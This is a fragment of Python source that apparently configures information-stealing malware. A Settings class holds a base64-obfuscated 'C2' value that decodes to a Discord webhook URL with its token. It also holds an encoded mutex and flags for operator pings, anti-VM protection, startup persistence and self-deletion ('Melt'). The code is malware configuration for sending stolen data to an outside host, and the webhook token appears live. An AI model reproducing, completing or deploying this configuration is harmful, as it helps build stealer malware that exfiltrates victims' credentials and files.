...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5MTc1NDkxODI5ODY2OTA5Ny9vUXpVc1dlcnRPSkd1ejhaTVIxOGhQSUZ2NHhiVjhKOUZ5OVBMYllpNXNpZlB6eGVvNTRhbGtkUE5fb21vZmdZOWU2UA==').decode())
    Mutex = base64.b64decode('ek81Z2todGlGNGNaZTJucw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
